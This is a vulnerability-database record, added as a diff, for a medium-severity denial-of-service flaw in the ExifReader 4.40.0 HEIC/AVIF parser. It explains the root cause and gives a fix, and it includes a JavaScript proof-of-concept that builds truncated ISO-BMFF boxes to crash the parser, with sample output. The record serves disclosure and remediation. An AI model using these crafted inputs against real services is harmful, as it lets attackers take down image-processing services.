@@ -1,0 +1,127 @@
+[id]
+ave_id = "AVE-2026-0399"
+aliases = ["CVE-2026-53496","GHSA-g77h-45rf-hcx4"]
+
+[basic]
+title = "ExifReader HEIC/AVIF ISO-BMFF parser throws uncaught RangeError on truncated boxes"
+description = "## Summary
+
+ExifReader 4.40.0 can throw an uncaught `RangeError: Offset is outside the bounds of the DataView` while parsing crafted HEIC/AVIF files. The file only needs a valid leading `ftyp` box with a HEIC/AVIF major brand followed by a malformed ISO-BMFF box, such as an empty 8-byte `free` box or a truncated extended-size box.
+
+This is reachable through the public `ExifReader.load()` API for in-memory buffers and through the async file/URL loaders when an application parses attacker-supplied images. In applications that do not wrap every parse in a defensive try/catch, a single uploaded or fetched image can abort the request/worker and cause a denial of service.
+
+Credit requested: Yaohui Wang.
+
+## Affected version tested
+
+- npm package: `exifreader`
+- Version: `4.40.0`
+- Repository commit tested: `8cb0261a26b7d986955fe0a6780f076dcb7902e7`
+
+## Root cause
+
+The ISO-BMFF parser assumes that every top-level box with at least an 8-byte header also has enough bytes for the fields required by its parsed form. In `src/image-header-iso-bmff.js`:
+
+- `findMetaBox()` calls `parseBox(dataView, offset)` while only checking that `offset + 8 <= dataView.byteLength`.
+- `parseBox()` calls `getBoxLength()` and then unconditionally reads fields such as the full-box version byte for `meta`/`iloc`/`iinf`/`idat` boxes.
+- `getBoxLength()` handles `boxLength === 1` by calling `hasEmptyHighBits(dataView, offset)`, which reads `dataView.getUint32(offset + 8)` without first checking that the 64-bit extended size field is present.
+
+As a result, syntactically small or truncated boxes after a valid HEIC/AVIF `ftyp` box escape the format-detection catch blocks and throw from the main parsing path.
+
+## Reproduction
+
+Run this from the repository root against the committed `dist/exif-reader.js` bundle:
+
+```js
+const ExifReader = require('./dist/exif-reader.js');
+
+function u32be(n) {
+  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+}
+function ascii(s) {
+  return Array.from(Buffer.from(s, 'ascii'));
+}
+function box(type, content = []) {
+  return [...u32be(8 + content.length), ...ascii(type), ...content];
+}
+
+for (const brand of ['heic', 'avif']) {
+  for (const badBox of ['free', 'abcd']) {
+    const bytes = Uint8Array.from([
+      ...box('ftyp', ascii(brand)),
+      ...box(badBox), // 8-byte box header with no content
+    ]);
+
+    try {
+      ExifReader.load(bytes.buffer);
+      console.log(`${brand}/${badBox}: no throw`);
+    } catch (e) {
+      console.log(`${brand}/${badBox}: ${e.name}: ${e.message}`);
+      console.log(String(e.stack).split('\n').slice(0, 6).join('\n'));
+    }
+  }
+}
+```
+
+Observed output on Node v23.11.0 with ExifReader 4.40.0:
+
+```text
+heic/free: RangeError: Offset is outside the bounds of the DataView
+RangeError: Offset is outside the bounds of the DataView
+    at DataView.prototype.getUint8 (<anonymous>)
+    at parseBox (.../dist/exif-reader.js:1:16513)
+    at findMetaBox (.../dist/exif-reader.js:1:19032)
+    at findOffsets (.../dist/exif-reader.js:1:19101)
+
+heic/abcd: RangeError: Offset is outside the bounds of the DataView
+avif/free: RangeError: Offset is outside the bounds of the DataView
+avif/abcd: RangeError: Offset is outside the bounds of the DataView
+```
+
+A second variant triggers the extended-size path:
+
+```js
+const truncatedExtendedBox = [...u32be(1), ...ascii('free')];
+const heic = Uint8Array.from([...box('ftyp', ascii('heic')), ...truncatedExtendedBox]);
+ExifReader.load(heic.buffer);
+```
+
+That throws from `hasEmptyHighBits()` / `getBoxLength()` because the extended-size high/low fields are not present.
+
+## Expected behavior
+
+Malformed/truncated metadata boxes should be handled like other malformed metadata in the project: return only the successfully parsed file type/metadata, return no app markers, or throw a controlled project-specific error. A safe JavaScript bounds error should not escape from the parser for an attacker-controlled image container.
+
+## Security impact
+
+This is a denial-of-service issue for services that parse user-provided HEIC/AVIF files with ExifReader. A minimal attacker-controlled image buffer can cause an unhandled exception in the parser and abort the surrounding request/worker if the embedding application does not catch every parse error.
+
+Suggested severity: Medium. Suggested CVSS: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`.
+
+## Suggested fix
+
+Add explicit bounds checks before every `DataView` read in the ISO-BMFF box parser, especially:
+
+- before reading the 64-bit extended size fields in `getBoxLength()`;
+- before reading the full-box version byte in `parseBox()`;
+- before descending into `parseSubBoxes()` when a declared box length exceeds available bytes;
+- ensure `findMetaBox()` breaks on boxes whose declared length is invalid or not fully present.
+
+A regression test should cover `ftyp/heic` and `ftyp/avif` followed by an 8-byte empty `free`/unknown box and by a truncated extended-size box."
+severity = "MEDIUM"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-24T09:03:49.968289679+00:00"
